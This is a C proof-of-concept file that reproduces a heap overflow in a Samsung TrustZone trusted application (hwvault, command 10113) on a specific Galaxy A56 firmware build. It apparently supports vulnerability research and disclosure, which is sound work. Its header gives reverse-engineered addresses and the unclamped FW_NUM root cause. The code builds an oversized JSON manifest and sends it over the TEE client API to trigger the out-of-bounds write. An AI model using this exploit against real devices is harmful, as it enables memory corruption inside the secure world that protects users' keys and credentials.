/*
 * ============================================================================
 * HvAUtW (hwvault) cmd 10113 = HV_TZ_CMD_KV2_*_WITH_MANIFEST
 *   S1-4 -- in-TA reproduction of the FW_NUM heap overflow on the CURRENT
 *   Galaxy A56 build A566BXXSCCZG7 (2026-07-10), driven end-to-end over the
 *   :1337 TEEC protocol. This is the A5x live path the submitted PoC
 *   (docs/manual-submission/hvautw-fwnum-heap-overflow/exploit.c) fires on a
 *   rooted device; here it is fired against the emulated shipping binary.
 * ============================================================================
 *
 * RE-DERIVED FROM THIS BINARY (sha256 81f55264b6b2fcd1..., 232 153 B):
 *   - cmd table build @0x15360: "mov w9,#0x2781" (=10113) stored at tbl+0x700,
 *     handler pointer from GOT 0x376a8 (R_AARCH64_RELATIVE addend 0x35894)
 *     stored at tbl+0x708  =>  handler = 0x35894.
 *   - handler 0x35894 calls get_items @0x12718 with THREE bytes-item tags:
 *        w5 = 0x02000197  (mov #0x197 ; movk #0x200,lsl16)      -> slot x29-0x10
 *        w7 = 0x0201019A  (mov #0x19a ; movk #0x201,lsl16)      -> slot x29-0x18
 *        w8 = 0x0200019C  (0x02000197 + 5)                      -> slot sp+0x20
 *     then @0x35980 "ldp x1,x0,[x29,#-0x18]; ldr x2,[sp,#0x20]; bl 0x344f8".
 *   - parser 0x344f8: "mov x23,x2" then "ldr x24,[x23,#8]" (data) /
 *     "ldr w26,[x23,#4]" (len)  =>  THE JSON MANIFEST IS TAG 0x0200019C.
 *   - the bug, verbatim in this build:
 *        0x34530/0x34548  mov w0,#0x130 ; bl OPENSSL_malloc   (304-byte buffer)
 *        0x345e0/0x345e8  bl atoi ; str w0,[x19,#8]           (fw_num := attacker)
 *        0x3460c          cbz w25 -> only a ZERO check, no upper clamp
 *        0x34678          madd x21,x25,#0x3c,x19              (v5 + 60*i)
 *        0x34730/0x34744  ldr w8,[x19,#8] ; cmp x25,x8 ; b.lo 0x3466c
 *     record i writes +12(4B ver) +16(8B type) +24(48B hex HASH), so i=4
 *     already writes 264..312 past the 304-byte chunk.
 *
 * ARGV: [fw_num] [n_images]   (default 8 8; use "4 4" for the no-overflow control)
 * EXPECTED: asan out-of-bounds write on the redzone right after the 304-byte
 * OPENSSL_malloc chunk, inside the parse loop -> CRASH_PC 0xdeadbeef.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"

#define HV_TZ_CMD_KV2_UPDATE_FW_WITH_MANIFEST 10113u
#define HV_TAG_AUX1     0x02000197u   /* bytes -> parser arg0 (post-overflow sig path) */
#define HV_TAG_AUX2     0x0201019Au   /* bytes -> parser arg1 (post-overflow sig path) */
#define HV_TAG_MANIFEST 0x0200019Cu   /* bytes -> parser arg2 = the JSON manifest */

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*, TEEC_Session*, const TEEC_UUID*,
                                     uint32_t, const void*, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*, uint32_t, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void cleanup_shm(void){
#if EMULATE
    system("ipcrm -M 0x13337"); system("ipcrm -M 0x13338");
    system("ipcrm -M 0x13339"); system("ipcrm -M 0x1333a");
#endif
}

static inline void put_u32(uint8_t *p, uint32_t v){ memcpy(p, &v, 4); }

/* identical grammar to the submitted device PoC's build_manifest() */
static int build_manifest(char *buf, int cap, int fw_num, int n_images)
{
    int o = snprintf(buf, cap,
        "{\"K250_VERSION\":\"1\",\"FW_NUM\":\"%d\",\"FW_IMAGE_LIST\":[", fw_num);
    for (int i = 0; i < n_images; i++) {
        char hash[97];
        int byte = 0x41 + i;                    /* 'A','B','C',... per image */
        for (int k = 0; k < 96; k += 2) {
            hash[k]   = "0123456789abcdef"[(byte >> 4) & 0xf];
            hash[k+1] = "0123456789abcdef"[byte & 0xf];
        }
        hash[96] = 0;
        o += snprintf(buf + o, cap - o,
            "%s{\"IMAGE_TYPE\":\"SPU_F%02d\",\"IMAGE_VERSION\":\"%d\",\"HASH\":\"%s\"}",
            i ? "," : "", i, 100 + i, hash);
    }
    o += snprintf(buf + o, cap - o, "]}");
    return o;
}

static uint32_t put_bytes_item(uint8_t *in, uint32_t off, uint32_t tag,
                               const void *data, uint32_t len)
{
    put_u32(in + off, tag);  off += 4;
    put_u32(in + off, len);  off += 4;
    if (len) memcpy(in + off, data, len);
    return off + len;
}

int main(int argc, char **argv)
{
    char* ta = "00000000-0000-0000-0000-487641557457";   /* HvAUtW (hwvault) */
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin; TEEC_Result res;
    TEEC_Context context; TEEC_Session session; TEEC_Operation op;
    int fw_num   = (argc > 1) ? atoi(argv[1]) : 8;
    int n_images = (argc > 2) ? atoi(argv[2]) : 8;

    cleanup_shm();
    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitializeContext failed 0x%x\n", res); exit(-1); }
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                                NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("OpenSession failed 0x%x origin 0x%x\n", res, err_origin);
        TEEC_FinalizeContext_impl(&context); exit(-1);
    }
    printf("[*] session opened to HvAUtW (hwvault) A566BXXSCCZG7, TEEC_LOGIN_PUBLIC\n");

    static char manifest[0x8000];
    int mlen = build_manifest(manifest, sizeof(manifest), fw_num, n_images);
    printf("[*] manifest JSON %d B  FW_NUM=%d  images=%d  (first OOB at image i=4)\n",
           mlen, fw_num, n_images);
    printf("[*] %.100s...\n", manifest);

    uint8_t *in  = (uint8_t*)allocate_param_mem(&context, 0x8000);
    uint8_t *out = (uint8_t*)allocate_param_mem(&context, 0x1000);
    if (!in || !out) { printf("[!] allocate_param_mem failed\n"); exit(-1); }
    memset(in, 0, 0x8000); memset(out, 0, 0x1000);

    static uint8_t aux[64];                 /* zeroed dummy payload for AUX1/AUX2 */
    uint32_t off = 8;
    off = put_bytes_item(in, off, HV_TAG_AUX1, aux, sizeof(aux));
    off = put_bytes_item(in, off, HV_TAG_AUX2, aux, sizeof(aux));
    off = put_bytes_item(in, off, HV_TAG_MANIFEST, manifest, (uint32_t)mlen);
    put_u32(in + 0, HV_TZ_CMD_KV2_UPDATE_FW_WITH_MANIFEST);
    put_u32(in + 4, off - 8);               /* payload_len = total - 8 */

    printf("[*] TLV envelope: cmd_id=10113 payload_len=%u total=%u (3 bytes-items)\n",
           off - 8, off);
    DumpHex(in, 32, in);

    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT,
                                     TEEC_NONE, TEEC_NONE);   /* wire 0x65 */
    op.params[0].tmpref.buffer = in;  op.params[0].tmpref.size = 0x8000;
    op.params[1].tmpref.buffer = out; op.params[1].tmpref.size = 0x1000;

    printf("[*] invoking GP cmd 10113 ptypes=0x%x ...\n", op.paramTypes);
    res = TEEC_InvokeCommand_impl(&session, HV_TZ_CMD_KV2_UPDATE_FW_WITH_MANIFEST,
                                  &op, &err_origin);
    printf("[*] cmd 10113 returned 0x%x (origin 0x%x)\n", res, err_origin);
    printf("[*] read the emulator log for the asan heap-OOB inside the parser @0x344f8\n");

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
